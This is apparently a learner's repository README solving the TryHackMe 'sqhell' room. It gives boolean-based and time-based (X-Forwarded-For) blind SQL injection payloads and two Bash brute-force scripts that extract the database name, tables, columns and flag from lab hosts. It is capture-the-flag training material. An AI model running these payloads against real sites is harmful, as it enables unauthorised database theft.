> Repository created to showcase the queries and scripts developed to solve and obtain the flags of the tryhackme | sqhell machine (https://tryhackme.com/room/sqhell), specifically the flags that required the use of SQL injection techniques: 'Time-based' > X-Forwarded-For and 'Boolean-based'. I want to clarify that I am currently learning about these vulnerabilities and scripting in Bash, so any recommendations and assistance are highly appreciated.

# Blind SQL Injection > ‘Boolean based’

## Determine the length of DB: 
> 
```sql
> admin' AND LENGTH(DATABASE())=8-- - 
> we can try with time sleep to confirm this:
> admin' AND LENGTH(DATABASE())=8 and sleep(20)-- -
```

## Extracting the database name:
```sql
admin' and (select substr(database(),1,1))='s'-- -
```

## Use this bash script to extract Database, tables, columns, and the flag. Just change the payload:
```bash
#!/bin/bash

trap ctrl_c INT

function ctrl_c() {
    echo -e "\n\n\033[0;31m[!] Exiting...\033[0m"
    exit 1
}

main_url="http://10.10.68.51/register/user-check?username=admin"
characters=( {a..z} {0..9} '!' '@' '#' '$' '%' '^' '&' '*' '(' ')' '-' '_' '=' '+' '[' ']' '{' '}' ';' ':' '<' '>' ',' '.' '?' '/' '\\' '|' '~')

function makeRequest() {

    database=""
    total_positions=8
    total_characters=${#characters[@]}

    echo -e "\n\033[1;32mStarting BruteForce\033[0m\n"

    for ((position=1; position<=total_positions; position++)); do

        for ((i=0; i<total_characters; i++)); do

            character=${characters[i]}
            payload="%27%20and%20(select%20substr(database(),$position,1))=%27$character%27--%20-"
            url_payload=$main_url$payload
            response=$(curl -s "$url_payload")
            echo -ne "\r\033[1;34m[+] Retrieving data:[\033[0m$database$character]"

            if [[ $response == *"false"* ]]; then
                database+=$character
                break
            fi

        done
       
    done

    echo -e "\n\033[1;32mData found:\033[0m \033[1;32m$database\033[0m\n"
}

makeRequest
```

## Check tables:
```sql
admin' and (select substr(table_name,1,1) from information_schema.tables where table_schema='sqhell_3' limit 1)='f'-- -
```
## Check columns:
```sql
admin' and (select substr(column_name,1,1) from information_schema.columns where table_schema='sqhell_3' and table_name='flag' limit 1,1)='f'-- -
```
## Enumerate the column selected ( Get the Flag)
```sql
admin' and (select substr(flag,1,1) from flag limit 1)='t'-- -
```

## To determine the length of the "flag" column from the "flag" table, you can use the following SQL query: 
> 
```sql
> admin' and (select length(flag) from flag limit 1)=43-- -
```

# Blind SQL Injection > ‘Time based’ > X-Forwarded-For

## Determine the length of DB: 
> 
```sql
> X-Forwarded-For:1' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND LENGTH(DATABASE())=8-- -
```

## Extracting the database name:
```sql
X-Forwarded-For:1' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND (SELECT substr(database(), 1, 1))='s'-- -
```

** Use this bash script to extract Database, tables, columns, and the flag. Just change the payload:
```bash
#!/bin/bash

trap ctrl_c INT

function ctrl_c() {
    echo -e "\n\n\033[0;31m[!] Exiting...\033[0m"
    exit 1
}

main_url="http://10.10.65.29"
characters=( {a..z} {0..9} '!' '@' '#' '$' '%' '^' '&' '*' '(' ')' '-' '_' '=' '+' '[' ']' '\{' '\}' ';' ':' '<' '>' ',' '.' '?' '/' '\\' '|' '~')

function makeRequest() {

    database=""
    total_positions=8
    total_characters=${#characters[@]}

    echo -e "\n\033[1;32mStarting BruteForce\033[0m\n"

    for ((position=1; position<=total_positions; position++)); do

        for ((i=0; i<total_characters; i++)); do

            character=${characters[i]}

            payload="1' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND (SELECT substr(database(), $position, 1))='$character'-- -"
            #url_payload=$main_url$payload
            echo -ne "\r\033[1;34m[+] Extracting the database name:[\033[0m$database$character]"
            time_start=$(date +%s.%N)
            response=$(curl -s -H "X-Forwarded-For:$payload" "$main_url")
            time_stop=$(date +%s.%N)

            duration=$(echo "$time_stop - $time_start" | bc )


            if (( $(echo "$duration >= 5" | bc -l) )); then
                database+="$character"
                break
            fi

        done

    done

    echo -e "\n\033[1;32mdatabase found:\033[0m \033[1;32m$database\033[0m\n"
}

makeRequest
```

## Check tables:
```sql
X-Forwarded-For:1' AND (SELECT SLEEP(5) FROM information_schema.tables WHERE table_schema='sqhell_1' AND SUBSTR(table_name, 1, 1) = 'f')-- -
```
## Check columns:
```sql
X-Forwarded-For:1' AND (SELECT SLEEP(5) FROM information_schema.columns WHERE table_schema='sqhell_1' and table_name='flag' AND SUBSTR(column_name, 1, 1) = 'f')-- -
```
## Enumerate the column selected ( Get the Flag)
```sql
X-Forwarded-For:1' AND (SELECT SLEEP(5) FROM flag where length(flag) = 43)-- -
```

## To determine the length of the "flag" column from the "flag" table, you can use the following SQL query: 
> 
```sql
> X-Forwarded-For:1' AND (SELECT SLEEP(5) FROM flag where length(flag) = 43)-- -
```
